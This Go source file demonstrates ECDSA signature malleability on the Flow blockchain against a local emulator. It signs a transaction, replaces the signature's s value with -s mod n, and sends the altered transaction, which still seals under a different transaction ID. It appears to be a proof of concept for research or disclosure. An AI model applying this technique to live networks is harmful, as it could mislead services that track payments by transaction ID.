package main

import (
	"context"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/big"

	"google.golang.org/grpc"

	ethcrypto "github.com/ethereum/go-ethereum/crypto"
	"github.com/onflow/flow-go-sdk"
	"github.com/onflow/flow-go-sdk/client"
	"github.com/onflow/flow-go-sdk/crypto"
	"github.com/onflow/flow-go-sdk/examples"
)

func ReplaceTransactionSignatureDemo() {
	fmt.Println("*** Replace Transaction Signature Demo ***")
	fmt.Println()
	ctx := context.Background()

	flowClient, err := client.New("127.0.0.1:3569", grpc.WithInsecure())
	examples.Handle(err)

	privateKey1 := RandomPrivateKeyS256()

	key1 := flow.NewAccountKey().
		SetPublicKey(privateKey1.PublicKey()).
		SetSigAlgo(privateKey1.Algorithm()).
		SetHashAlgo(crypto.SHA2_256).
		SetWeight(flow.AccountKeyWeightThreshold)

	key1Signer := crypto.NewInMemorySigner(privateKey1, key1.HashAlgo)

	fmt.Println("Create account:")
	account1 := examples.CreateAccount(flowClient, []*flow.AccountKey{key1})
	// Add some flow for the transaction fees
	fmt.Println()
	fmt.Println("Fund account:")
	examples.FundAccountInEmulator(flowClient, account1.Address, 1.0)
	fmt.Println()

	fmt.Println("Do signature stuff:")
	referenceBlockID := examples.GetReferenceBlockId(flowClient)
	tx := flow.NewTransaction().
		SetScript([]byte(`
			 transaction { 
				 prepare(signer: AuthAccount) { log(signer.address) }
			 }
		 `)).
		SetGasLimit(100).
		SetProposalKey(account1.Address, account1.Keys[0].Index, account1.Keys[0].SequenceNumber).
		SetReferenceBlockID(referenceBlockID).
		SetPayer(account1.Address).
		AddAuthorizer(account1.Address)

	// account 1 signs the envelope with key 1
	err = tx.SignEnvelope(account1.Address, account1.Keys[0].Index, key1Signer)
	examples.Handle(err)

	origSigJSON, err := json.MarshalIndent(tx.EnvelopeSignatures[0], "", "  ")
	fmt.Printf("orig sig json: %s\n", string(origSigJSON))
	origTxID := hex.EncodeToString(tx.ID().Bytes())
	fmt.Printf("orig txid is %s\n", origTxID)
	fmt.Println()

	replaceSignature(tx, ethcrypto.S256())

	trickSigJSON, err := json.MarshalIndent(tx.EnvelopeSignatures[0], "", "  ")
	fmt.Printf("trick sig json: %s\n", string(trickSigJSON))
	trickTxID := hex.EncodeToString(tx.ID().Bytes())
	fmt.Printf("trick txid is %s\n", trickTxID)

	err = flowClient.SendTransaction(ctx, *tx)
	examples.Handle(err)

	examples.WaitForSeal(ctx, flowClient, tx.ID())

	fmt.Println("Transaction with trick signature complete!")
	fmt.Println()
}

func replaceSignature(tx *flow.Transaction, curve elliptic.Curve) {
	origSig := tx.EnvelopeSignatures[0].Signature
	rBytes := origSig[:len(origSig)/2]
	sBytes := origSig[len(origSig)/2:]
	r := new(big.Int).SetBytes(rBytes)
	s := new(big.Int).SetBytes(sBytes)

	trickR, trickS := TrickSig(r, s, curve)
	trickSig := append(trickR.Bytes(), trickS.Bytes()...)
	tx.EnvelopeSignatures[0].Signature = trickSig
}

// TrickSig uses a given valid signature (r, s) over a message hash
// to calculate another valid signature over the same message hash as (r, -s mod n)
// where n is the curve order i.e. the order of the base point
func TrickSig(r, s *big.Int, curve elliptic.Curve) (*big.Int, *big.Int) {
	return r, ScalarNeg(s, curve)
}

// ScalarNeg negates a scalar modulo the curve order
func ScalarNeg(scalar *big.Int, curve elliptic.Curve) *big.Int {
	return new(big.Int).Mod(new(big.Int).Neg(scalar), curve.Params().N)
}

func RandomPrivateKeyS256() crypto.PrivateKey {
	seed := make([]byte, crypto.MinSeedLength)
	_, err := rand.Read(seed)
	examples.Handle(err)

	privateKey, err := crypto.GeneratePrivateKey(crypto.ECDSA_secp256k1, seed)
	examples.Handle(err)

	return privateKey
}

func bitsToBytes(bits int) int {
	return (bits + 7) >> 3
}
